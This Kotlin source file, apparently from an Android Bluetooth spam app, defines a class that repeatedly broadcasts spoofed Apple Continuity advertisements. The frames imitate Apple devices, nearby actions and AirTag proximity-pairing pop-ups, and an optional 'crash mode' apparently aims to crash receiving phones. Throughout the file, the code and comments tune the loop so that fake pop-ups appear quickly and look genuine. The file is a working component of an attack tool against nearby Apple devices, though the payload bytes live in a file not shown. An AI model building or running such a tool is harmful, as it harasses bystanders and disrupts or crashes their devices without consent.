package com.droid.flippy

import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class ContinuitySingleSpam(
    private val device: ContinuityDevice,
    private val crashMode: Boolean
) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val rand = Random()

    override fun start() {
        executor.execute {
            isSpamming = true
            val advertiser = BluetoothAdvertiser()
            // Apple fast path (same as whole-mode): legacy-only,
            // non-connectable, no scan response. Extended sets are why
            // single Device/Action items took forever or never popped.
            // Fix color once per start so the frame looks like one stable
            // physical device instead of flapping colors every packet.
            val deviceVal = device.value.removePrefix("0x").uppercase()
            val fixedColor = ContinuityPayloads.pickRandomColorForDevice(deviceVal, rand)
            while (isSpamming) {
                val payload = buildPayload(device, crashMode, rand, fixedColor)
                try {
                    advertiser.advertiseApple(payload)
                } catch (_: Exception) {
                }
                blinkRunnable?.run()
                try {
                    Thread.sleep(Helper.delay.coerceIn(20, 60).toLong())
                } catch (_: InterruptedException) {
                    break
                }
            }
            try {
                advertiser.stopApple()
            } catch (_: Exception) {
            }
            executor.shutdown()
        }
    }

    override fun stop() {
        isSpamming = false
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun setBlinkRunnable(runnable: Runnable?) {
        blinkRunnable = runnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun buildPayload(device: ContinuityDevice, crashMode: Boolean, rand: Random, fixedColor: String): ByteArray {
        return when (device.deviceType) {
            ContinuityType.ACTION -> ContinuityPayloads.nearbyActionPayload(
                device.value.removePrefix("0x").uppercase(), crashMode, rand
            )
            ContinuityType.DEVICE -> ContinuityPayloads.devicePayload(
                device.value.removePrefix("0x").uppercase(), rand, fixedColor
            )
            ContinuityType.NOTYOURDEVICE -> {
                val deviceVal = device.value.removePrefix("0x").uppercase()
                val isAirTag = deviceVal == "0055" || deviceVal == "0030"
                val prefix = if (isAirTag) "05" else "01"
                ContinuityPayloads.proximityPairPayload(prefix, deviceVal, fixedColor, rand)
            }
        }
    }
}

